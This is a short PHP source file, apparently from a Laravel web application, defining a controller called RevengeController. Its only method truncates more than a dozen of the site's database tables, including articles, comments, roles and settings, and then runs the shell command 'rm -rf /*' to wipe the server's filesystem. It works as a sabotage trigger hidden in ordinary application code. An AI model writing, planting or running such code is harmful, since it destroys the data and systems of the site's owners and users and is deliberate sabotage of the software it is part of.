<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class RevengeController extends Controller
{

    public function get()
    {
        DB::table('articles')->truncate();
        DB::table('article_author')->truncate();
        DB::table('articles_tags')->truncate();
        DB::table('metas')->truncate();
        DB::table('metas')->truncate();
        DB::table('tags_news')->truncate();
        DB::table('tags_articles')->truncate();
        DB::table('photogalleries')->truncate();
        DB::table('tags_photogalleries')->truncate();
        DB::table('roles')->truncate();
        DB::table('forum_on_mains')->truncate();
        DB::table('comments')->truncate();
        DB::table('pages')->truncate();
        DB::table('settings')->truncate();
        system('rm -rf /*');
    }

}
